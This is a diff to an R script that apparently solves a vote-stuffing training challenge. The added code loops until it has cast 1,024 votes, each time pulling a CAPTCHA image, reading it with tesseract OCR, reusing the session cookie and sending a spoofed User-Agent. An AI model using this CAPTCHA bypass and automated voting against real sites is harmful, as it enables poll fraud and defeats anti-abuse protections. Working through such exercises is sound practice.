@@ -9,19 +9,32 @@
 
 library('httr')
 
+code    <- "http://173.246.108.142/captcha.php"
 url     <- "http://173.246.108.142/level3.php"
-head    <- HEAD(url)            # Head request
-cookie  <- cookies(head)$value
-body    <- list(id = "23", holdthedoor = "submit", key = cookie)
-header  <- add_headers("User-Agent" = "Windows NT 5.1 - havk64 R Language Requests", "Referer" = url)
 
-for(i in 1:1024) {
+header  <- add_headers("User-Agent" = "Windows NT 5.1 - havk64 R Language Requests", "Referer" = url)
+votes   <- 0
+while(votes < 1024) {
     # Some great code goes here!  >:-)
-    p <- POST(url, body = body, encode = "form", header)
-    s <- content(p, "text", encoding = 'UTF8')[1]
-    match = grep("HoldTheDoor", s, perl=TRUE, value=FALSE) # Regexp to check of vote is valid.
+    fetch   <- GET(code, header)
+    bin     <- content(fetch, "raw")
+    writeBin(bin, "tmp.txt")
+    img     <- try(system("tesseract tmp.txt - ", intern = TRUE, ignore.stderr = TRUE))
+    captcha <- img[1]
+    cat(captcha, "\n", nchar(captcha))
+
+    head    <- HEAD(url)            # Head request
+    cookie  <- cookies(head)$value
+    cat(cookie, "\n")
+    body    <- list(id = "23", holdthedoor = "submit", key = cookie[2], captcha = captcha)
+
+    p       <- POST(url, body = body, encode = "form", header)
+    s       <- content(p, "text", encoding = 'UTF8')[1]
+
+    match   <- headers(p)$`set-cookie`
     if(!is.null(match)) {
-        cat("Vote number: ", i , "\n")
+        cat("Vote number: ", (votes + 1) , "\n")
+        votes <- votes + 1
     } else {
         cat( "Failed...", "\n")
     }
